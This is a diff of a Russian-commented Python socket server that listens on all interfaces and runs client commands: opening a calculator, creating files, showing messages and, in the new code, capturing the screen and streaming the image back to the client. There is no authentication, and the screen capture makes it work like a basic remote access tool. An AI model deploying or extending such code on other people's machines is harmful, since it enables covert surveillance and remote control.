@@ -1,13 +1,16 @@
 import socket
 import subprocess
 import os
-
 import webbrowser
 import platform
-#import psutil
 from PIL import ImageGrab
 import time
 from datetime import datetime
+from io import BytesIO
+
+
+
+#import psutil
 # Настройки сервера
 HOST = '0.0.0.0'  # Слушать все адреса
 PORT = 8080       # Порт для подключения
@@ -48,12 +51,10 @@ def heandle_client(conn, addr):
 
             elif command.startswith("open_calculator") or command.startswith("1"):
                 # Открыть калькулятор
-                print(1)
                 if os.name == "nt":  # Windows
                     subprocess.Popen("calc.exe")
-                    print(1)
-                # elif os.name == "posix":  # Linux/Mac
-                #     subprocess.Popen(["gnome-calculator"])
+                elif os.name == "posix":  # Linux/Mac
+                    subprocess.Popen(["gnome-calculator"])
                 conn.send("Калькулятор запущен.".encode("utf-8"))
 
             elif command.startswith("create_file") or command.startswith("2"):
@@ -147,11 +148,46 @@ def heandle_client(conn, addr):
                 conn.send(f"Сообщение '{message}' отправлено.".encode("utf-8"))
 
 
-            elif command.startswith("screenshot") :
-                screenshot_path = os.path.join(os.path.expanduser("~"), "Desktop", "screenshot.png")
-                screenshot = ImageGrab.grab()
-                screenshot.save(screenshot_path)
-                conn.send(f"Скриншот сохранен на сервере: {screenshot_path}".encode("utf-8"))
+            # elif command.startswith("screenshot") :
+            #     screenshot_path = os.path.join(os.path.expanduser("~"), "Desktop", "screenshot.png")
+            #     screenshot = ImageGrab.grab()
+            #     screenshot.save(screenshot_path)
+            #     conn.send(f"Скриншот сохранен на сервере: {screenshot_path}".encode("utf-8"))
+
+            elif command.startswith("screenshot"):
+                # Создание скриншота
+                # screenshot = ImageGrab.grab()
+                # screenshot_path = os.path.join(os.path.expanduser("~"), "Desktop", "screenshot_server.png")
+                # screenshot.save(screenshot_path)
+
+                # # Отправка клиенту уведомления о начале передачи файла
+                # conn.send(b"FILE_TRANSFER_START")
+                # with open(screenshot_path, "rb") as file:
+                #     while (chunk := file.read(4096)):
+                #         conn.send(chunk)
+                # conn.send(b"FILE_TRANSFER_END")
+                try:
+                    # Создание скриншота
+                    screenshot = ImageGrab.grab()
+
+                    # Сохранение скриншота в памяти
+                    screenshot_bytes = BytesIO()
+                    screenshot.save(screenshot_bytes, format="PNG")
+                    screenshot_bytes.seek(0)
+
+                    # Уведомление клиента о начале передачи
+                    conn.send(b"FILE_TRANSFER_START")
+
+                    # Отправка скриншота по частям
+                    while chunk := screenshot_bytes.read(4096):
+                        conn.send(chunk)
+
+                    # Уведомление клиента о завершении передачи
+                    conn.send(b"FILE_TRANSFER_END")
+
+                except Exception as e:
+                    conn.send(f"Ошибка: {e}".encode("utf-8"))
+
 
 
             else:
